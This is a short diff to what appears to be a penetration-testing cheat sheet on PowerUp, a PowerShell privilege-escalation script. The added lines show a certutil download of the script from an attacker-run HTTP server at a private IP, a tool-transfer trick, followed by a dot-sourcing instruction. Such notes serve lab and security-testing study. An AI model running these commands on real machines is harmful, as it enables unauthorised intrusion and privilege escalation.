@@ -2,8 +2,12 @@
 
 # PowerUp
 
-```
+```bash
+# Remote
 wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
+
+# local
+certutil -urlcache -split -f "http://10.17.68.184:8000/PowerUp.ps1" PowerUp.ps1
 ```
 
 To run PowerUp, start a PowerShell session and **use dot sourcing to load the script:**
